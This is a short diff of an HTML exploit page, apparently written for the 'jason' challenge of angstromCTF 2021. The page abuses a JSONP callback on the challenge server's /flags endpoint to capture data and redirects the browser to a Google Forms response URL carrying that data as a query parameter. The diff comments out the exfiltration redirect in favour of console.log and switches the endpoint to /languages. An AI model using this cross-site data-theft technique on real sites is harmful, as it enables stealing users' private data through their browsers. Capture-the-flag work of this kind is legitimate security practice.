@@ -16,8 +16,9 @@ document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFt
 
 <script>
     function xss_redirect(data){
-        document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + data.toString()
+        console.log(data)
+        //document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + data.toString()
     }
 </script>
 
-<script src="https://jason.2021.chall.actf.co/flags?callback=xss_redirect"></script>
+<script src="https://jason.2021.chall.actf.co/languages?callback=xss_redirect"></script>
